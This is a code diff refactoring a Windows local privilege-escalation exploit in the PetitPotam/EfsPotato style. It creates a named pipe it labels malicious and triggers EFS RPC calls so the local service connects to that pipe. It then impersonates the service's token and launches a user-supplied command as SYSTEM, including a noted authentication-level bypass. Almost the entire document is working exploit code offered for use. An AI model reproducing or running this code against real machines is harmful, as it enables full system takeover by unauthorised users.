@@ -6,95 +6,14 @@
 #include <strsafe.h>
 #include <iostream>
 #include <userenv.h>
+#include <string>
 
 #pragma comment(lib, "RpcRT4.lib")
 #pragma comment(lib, "userenv.lib")
 
-
-HANDLE CreatePetitNamedPipe();
-
-HANDLE ConnectPetitNamedPipe(HANDLE hNamedPipe);
-
-DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam);
-
-void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine);
-
-void PetitPotamConnect(DWORD EfsID);
+using  std::string;
 
 BOOL g_bInteractWithConsole = TRUE;
-
-
-void _tmain(int argc, TCHAR* argv[])
-{
-    if (argc != 3)
-    {
-        printf("\nUsage: %S [EfsID] [Command]\n\n", argv[0]);
-        printf("The available EfsIDs are as follows: \n");
-        printf("    [0] EfsRpcOpenFileRaw\n");
-        printf("    [1] EfsRpcEncryptFileSrv\n");
-        printf("    [2] EfsRpcDecryptFileSrv\n");
-        printf("    [3] EfsRpcQueryUsersOnFile\n");
-        printf("    [4] EfsRpcQueryRecoveryAgents\n");
-        printf("    [5] EfsRpcRemoveUsersFromFile (Failed)\n");
-        printf("    [6] EfsRpcAddUsersToFile\n");
-        printf("    [7] EfsRpcFileKeyInfo\n");
-        printf("    [8] EfsRpcDuplicateEncryptionInfoFile (Failed)\n");
-        printf("    [9] EfsRpcAddUsersToFileEx\n");
-        printf("    [10] EfsRpcFileKeyInfoEx (Failed)\n");
-        printf("    [11] EfsRpcGetEncryptedFileMetadata (Failed)\n");
-        printf("    [12] EfsRpcSetEncryptedFileMetadata (Failed)\n");
-
-        return;
-    }
-
-    HANDLE hThread = NULL;
-
-    hThread = CreateThread(NULL, 0, LaunchPetitNamedPipeServer, (LPWSTR)argv[2], 0, NULL);
-    DWORD EfsID = (DWORD)_wtol((TCHAR*)argv[1]);
-
-    Sleep(1000);
-    PetitPotamConnect(EfsID);
-    Sleep(1500);
-}
-
-
-DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam)
-{
-    HANDLE hNamedPipe = NULL;
-    LPWSTR lpName;
-    LPWSTR lpCommandLine = (LPWSTR)lpParam;
-
-    SECURITY_DESCRIPTOR sd = { 0 };
-    SECURITY_ATTRIBUTES sa = { 0 };
-
-    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-    StringCchPrintf(lpName, MAX_PATH, L"\\\\.\\pipe\\petit\\pipe\\srvsvc");
-
-    if ((hNamedPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)))
-    {
-        printf("\n[+] Malicious named pipe running on %S.\n", lpName);
-    }
-    else
-    {
-        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
-        return 0;
-    }
-
-    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
-    {
-        printf("[+] The connection is successful.\n");
-    }
-    else
-    {
-        printf("[-] ConnectNamedPipe() Error: %i.\n", GetLastError());
-        return 0;
-    }
-
-    GetSystem(hNamedPipe, lpCommandLine);
-    CloseHandle(hNamedPipe);
-
-    return 0;
-}
 
 
 void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
@@ -102,7 +21,6 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
-    HANDLE hProcess;
     HANDLE hToken = NULL;
     HANDLE phNewToken = NULL;
 
@@ -170,10 +88,10 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
         printf("[+] CreateProcessAsUser OK.\n");
     }
     else if (GetLastError() != NULL)
-    {   
+    {
         RevertToSelf();
         printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");
-        
+
         if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
         {
             printf("[+] CreateProcessWithTokenW OK.\n");
@@ -209,54 +127,101 @@ cleanup:
 }
 
 
-void PetitPotamConnect(DWORD EfsID)
+DWORD WINAPI LaunchNamedPipeServer(LPVOID lpParam)
 {
-    RPC_WSTR ObjUuid = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";    // Pointer to a null-terminated string representation of an object UUID. 
-    RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                // Pointer to a null-terminated string representation of a protocol sequence.;
-    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                       // Pointer to a null-terminated string representation of a network address.
-    RPC_WSTR Endpoint = (RPC_WSTR)L"\\pipe\\efsrpc";                          // Pointer to a null-terminated string representation of an endpoint.
-    RPC_WSTR Options = NULL;                                                 // Pointer to a null-terminated string representation of network options.
-    RPC_WSTR StringBinding;                                                  // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.
+    HANDLE hNamedPipe = NULL;
+    LPWSTR lpName;
+    LPWSTR lpCommandLine = (LPWSTR)lpParam;
+
+    SECURITY_DESCRIPTOR sd = { 0 };
+    SECURITY_ATTRIBUTES sa = { 0 };
+
+    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+    StringCchPrintfW(lpName, MAX_PATH, L"\\\\.\\pipe\\petit\\pipe\\srvsvc");
+
+    if ((hNamedPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)))
+    {
+        printf("\n[+] Malicious named pipe running on %S.\n", lpName);
+    }
+    else
+    {
+        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
+        return 0;
+    }
+
+    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
+    {
+        printf("[+] The connection is successful.\n");
+    }
+    else
+    {
+        printf("[-] ConnectNamedPipe() Error: %i.\n", GetLastError());
+        return 0;
+    }
+
+    GetSystem(hNamedPipe, lpCommandLine);
+    CloseHandle(hNamedPipe);
+
+    return 0;
+}
+
+
+BOOL CreateRpcBinding(RPC_BINDING_HANDLE* hBinding)
+{
+    BOOL status = FALSE;
+    RPC_WSTR ObjUuid = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";                // Pointer to a null-terminated string representation of an object UUID. 
+    RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                            // Pointer to a null-terminated string representation of a protocol sequence.;
+    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                                   // Pointer to a null-terminated string representation of a network address.
+    RPC_WSTR Endpoint = NULL;                                                            // Pointer to a null-terminated string representation of an endpoint.
+    RPC_WSTR Options = NULL;                                                             // Pointer to a null-terminated string representation of network options.
+    RPC_WSTR StringBinding;                                                              // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.
 
     RPC_STATUS RpcStatus;
 
-    RPC_BINDING_HANDLE binding_h;
+    *hBinding = NULL;
 
     RpcStatus = RpcStringBindingComposeW(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, &StringBinding);
     if (RpcStatus != RPC_S_OK) {
         printf("[-] RpcStringBindingComposeW() Error: %i\n", GetLastError());
-        return;
+        return status;
     }
 
 
     RpcStatus = RpcBindingFromStringBindingW(
         StringBinding,    // Previously created string binding
-        &binding_h    // Output binding handle
+        hBinding    // Output binding handle
     );
     if (RpcStatus != RPC_S_OK) {
         printf("[-] RpcBindingFromStringBindingW() Error: %i\n", GetLastError());
-        return;
+        return status;
     }
 
     // PetitPotam bypass via RPC_C_AUTHN_LEVEL_PKT_PRIVACY: https://github.com/zcgonvh/EfsPotato/pull/5
-    RpcStatus = RpcBindingSetAuthInfoW(binding_h, NetworkAddr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NONE);
+    RpcStatus = RpcBindingSetAuthInfoW(*hBinding, NetworkAddr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NONE);
     if (RpcStatus != RPC_S_OK) {
         printf("[-] RpcBindingSetAuthInfoW() Error: %i\n", GetLastError());
-        return;
+        return status;
     }
 
-    RpcStatus = RpcBindingSetOption(binding_h, 12, 50000);
+    RpcStatus = RpcBindingSetOption(*hBinding, 12, 5000000);
     if (RpcStatus != RPC_S_OK) {
         printf("[-] RpcBindingSetOption() Error: %i\n", GetLastError());
-        return;
+        return status;
     }
 
     RpcStringFreeW(&StringBinding);
     if (RpcStatus != RPC_S_OK) {
         printf("[-] RpcStringFreeW() Error: %i\n", GetLastError());
-        return;
+        return status;
     }
 
+    status = (RpcStatus == RPC_S_OK);
+    return status;
+}
+
+
+void EfsRpcTrigger(RPC_BINDING_HANDLE hBinding, DWORD efsId)
+{
     RpcTryExcept
     {
         // Invoke remote procedure here
@@ -264,16 +229,16 @@ void PetitPotamConnect(DWORD EfsID)
         long result;
 
         PipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-        StringCchPrintf(PipeFileName, MAX_PATH, L"\\\\localhost/pipe/petit\\C$\\wh0nqs.txt");
+        StringCchPrintfW(PipeFileName, MAX_PATH, L"\\\\localhost/pipe/petit\\C$\\wh0nqs.txt");
 
 
-        if (EfsID == 0)
+        if (efsId == 0)
         {
             wprintf(L"[+] Invoking EfsRpcOpenFileRaw with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  long EfsRpcOpenFileRaw(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
              *      [in, string] wchar_t* FileName,
              *      [in] long Flags
@@ -281,105 +246,105 @@ void PetitPotamConnect(DWORD EfsID)
              */
 
             PVOID hContext;
-            result = EfsRpcOpenFileRaw(binding_h, &hContext, PipeFileName, 0);
+            result = EfsRpcOpenFileRaw(hBinding, &hContext, PipeFileName, 0);
         }
 
-        if (EfsID == 1)
+        if (efsId == 1)
         {
             wprintf(L"[+] Invoking EfsRpcEncryptFileSrv with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  long EfsRpcEncryptFileSrv(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName
              *  );
             */
 
-            result = EfsRpcEncryptFileSrv(binding_h, PipeFileName);
+            result = EfsRpcEncryptFileSrv(hBinding, PipeFileName);
         }
 
-        if (EfsID == 2)
+        if (efsId == 2)
         {
             wprintf(L"[+] Invoking EfsRpcDecryptFileSrv with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  long EfsRpcDecryptFileSrv(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName,
              *      [in] unsigned long OpenFlag
              *  );
              */
 
-            result = EfsRpcDecryptFileSrv(binding_h, PipeFileName, 0);
+            result = EfsRpcDecryptFileSrv(hBinding, PipeFileName, 0);
         }
 
-        if (EfsID == 3)
+        if (efsId == 3)
         {
             wprintf(L"[+] Invoking EfsRpcQueryUsersOnFile with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcQueryUsersOnFile(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName,
              *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *Users
              *  );
              */
 
             ENCRYPTION_CERTIFICATE_HASH_LIST* Users;
-            result = EfsRpcQueryUsersOnFile(binding_h, PipeFileName, &Users);
+            result = EfsRpcQueryUsersOnFile(hBinding, PipeFileName, &Users);
         }
-        if (EfsID == 4)
+        if (efsId == 4)
         {
             wprintf(L"[+] Invoking EfsRpcQueryRecoveryAgents with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcQueryRecoveryAgents(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName,
              *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *RecoveryAgents
              *  );
              */
 
             ENCRYPTION_CERTIFICATE_HASH_LIST* RecoveryAgents;
-            result = EfsRpcQueryRecoveryAgents(binding_h, PipeFileName, &RecoveryAgents);
+            result = EfsRpcQueryRecoveryAgents(hBinding, PipeFileName, &RecoveryAgents);
         }
-        if (EfsID == 5)    // error
+        if (efsId == 5)    // error
         {
             wprintf(L"[+] Invoking EfsRpcRemoveUsersFromFile with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcRemoveUsersFromFile(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName,
              *      [in] ENCRYPTION_CERTIFICATE_HASH_LIST* Users
              *  );
              */
 
             ENCRYPTION_CERTIFICATE_HASH_LIST Users;
-            result = EfsRpcRemoveUsersFromFile(binding_h, PipeFileName, &Users);
+            result = EfsRpcRemoveUsersFromFile(hBinding, PipeFileName, &Users);
         }
-        if (EfsID == 6)
+        if (efsId == 6)
         {
             wprintf(L"[+] Invoking EfsRpcAddUsersToFile with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcAddUsersToFile(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName,
              *      [in] ENCRYPTION_CERTIFICATE_LIST * EncryptionCertificates
              *  );
              */
 
             ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
-            result = EfsRpcAddUsersToFile(binding_h, PipeFileName, &EncryptionCertificates);
+            result = EfsRpcAddUsersToFile(hBinding, PipeFileName, &EncryptionCertificates);
         }
-        if (EfsID == 7)
+        if (efsId == 7)
         {
             wprintf(L"[+] Invoking EfsRpcFileKeyInfo with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcFileKeyInfo(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* FileName,
              *      [in] DWORD InfoClass,
              *      [out] EFS_RPC_BLOB** KeyInfo
@@ -387,16 +352,16 @@ void PetitPotamConnect(DWORD EfsID)
              */
 
             EFS_RPC_BLOB* KeyInfo;
-            result = EfsRpcFileKeyInfo(binding_h, PipeFileName, 0, &KeyInfo);
+            result = EfsRpcFileKeyInfo(hBinding, PipeFileName, 0, &KeyInfo);
 
         }
-        if (EfsID == 8)    // error
+        if (efsId == 8)    // error
         {
             wprintf(L"[+] Invoking EfsRpcDuplicateEncryptionInfoFile with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcDuplicateEncryptionInfoFile(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string] wchar_t* SrcFileName,
              *      [in, string] wchar_t* DestFileName,
              *      [in] DWORD dwCreationDisposition,
@@ -407,16 +372,16 @@ void PetitPotamConnect(DWORD EfsID)
              */
 
             EFS_RPC_BLOB RelativeSD;
-            result = EfsRpcDuplicateEncryptionInfoFile(binding_h, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
+            result = EfsRpcDuplicateEncryptionInfoFile(hBinding, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
         }
 
-        if (EfsID == 9)
+        if (efsId == 9)
         {
             wprintf(L"[+] Invoking EfsRpcAddUsersToFileEx with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcAddUsersToFileEx(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in] DWORD dwFlags,
              *      [in, unique] EFS_RPC_BLOB* Reserved,
              *      [in, string] wchar_t* FileName,
@@ -426,16 +391,16 @@ void PetitPotamConnect(DWORD EfsID)
 
             EFS_RPC_BLOB Reserved;
             ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
-            result = EfsRpcAddUsersToFileEx(binding_h, 0, &Reserved, PipeFileName, &EncryptionCertificates);
+            result = EfsRpcAddUsersToFileEx(hBinding, 0, &Reserved, PipeFileName, &EncryptionCertificates);
         }
 
-        if (EfsID == 10)    // error
+        if (efsId == 10)    // error
         {
             wprintf(L"[+] Invoking EfsRpcFileKeyInfoEx with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcFileKeyInfoEx(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in] DWORD dwFileKeyInfoFlags,
              *      [in, unique] EFS_RPC_BLOB* Reserved,
              *      [in, string] wchar_t* FileName,
@@ -446,31 +411,31 @@ void PetitPotamConnect(DWORD EfsID)
 
             EFS_RPC_BLOB Reserved;
             EFS_RPC_BLOB* KeyInfo;
-            result = EfsRpcFileKeyInfoEx(binding_h, 0, &Reserved, PipeFileName, 0, &KeyInfo);
+            result = EfsRpcFileKeyInfoEx(hBinding, 0, &Reserved, PipeFileName, 0, &KeyInfo);
         }
-        if (EfsID == 11)    // error
+        if (efsId == 11)    // error
         {
             wprintf(L"[+] Invoking EfsRpcGetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcGetEncryptedFileMetadata(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string, ref] wchar_t* FileName,
              *      [out, ref] EFS_RPC_BLOB ** EfsStreamBlob
              *  );
              */
 
             EFS_RPC_BLOB* EfsStreamBlob;
-            result = EfsRpcGetEncryptedFileMetadata(binding_h, PipeFileName, &EfsStreamBlob);
+            result = EfsRpcGetEncryptedFileMetadata(hBinding, PipeFileName, &EfsStreamBlob);
         }
 
-        if (EfsID == 12)    // error
+        if (efsId == 12)    // error
         {
             wprintf(L"[+] Invoking EfsRpcSetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);
 
             /*
              *  DWORD EfsRpcSetEncryptedFileMetadata(
-             *      [in] handle_t binding_h,
+             *      [in] handle_t hBinding,
              *      [in, string, ref] wchar_t* FileName,
              *      [in, unique] EFS_RPC_BLOB* OldEfsStreamBlob,
              *      [in, ref] EFS_RPC_BLOB* NewEfsStreamBlob,
@@ -481,7 +446,7 @@ void PetitPotamConnect(DWORD EfsID)
             EFS_RPC_BLOB OldEfsStreamBlob;
             EFS_RPC_BLOB NewEfsStreamBlob;
             ENCRYPTED_FILE_METADATA_SIGNATURE NewEfsSignature;
-            result = EfsRpcSetEncryptedFileMetadata(binding_h, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
+            result = EfsRpcSetEncryptedFileMetadata(hBinding, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
         }
 
         LocalFree(PipeFileName);
@@ -492,8 +457,50 @@ void PetitPotamConnect(DWORD EfsID)
     }
     RpcEndExcept
     {
-        RpcBindingFree(&binding_h);
+        RpcBindingFree(&hBinding);
     }
+}
+
+
+void wmain(int argc, wchar_t* argv[])
+{
+    if (argc != 3)
+    {
+        printf("\nUsage: %S [efsId] <command>\n\n", argv[0]);
+        printf("The available efsIds are as follows: \n");
+        printf("    [0] EfsRpcOpenFileRaw\n");
+        printf("    [1] EfsRpcEncryptFileSrv\n");
+        printf("    [2] EfsRpcDecryptFileSrv\n");
+        printf("    [3] EfsRpcQueryUsersOnFile\n");
+        printf("    [4] EfsRpcQueryRecoveryAgents\n");
+        printf("    [5] EfsRpcRemoveUsersFromFile (Failed)\n");
+        printf("    [6] EfsRpcAddUsersToFile\n");
+        printf("    [7] EfsRpcFileKeyInfo\n");
+        printf("    [8] EfsRpcDuplicateEncryptionInfoFile (Failed)\n");
+        printf("    [9] EfsRpcAddUsersToFileEx\n");
+        printf("    [10] EfsRpcFileKeyInfoEx (Failed)\n");
+        printf("    [11] EfsRpcGetEncryptedFileMetadata (Failed)\n");
+        printf("    [12] EfsRpcSetEncryptedFileMetadata (Failed)\n");
+
+        return;
+    }
+
+    RPC_BINDING_HANDLE hBinding;
+    HANDLE hThread = NULL;
+
+    hThread = CreateThread(NULL, 0, LaunchNamedPipeServer, (LPWSTR)argv[2], 0, NULL);
+    DWORD efsId = (DWORD)_wtol(argv[1]);
+
+    Sleep(1000);
+
+    if (!CreateRpcBinding(&hBinding))
+    {
+        printf("[-] Create rpc binding failed: %i\n");
+        return;
+    }
+
+    EfsRpcTrigger(hBinding, efsId);
+    Sleep(1500);
 }
 
 
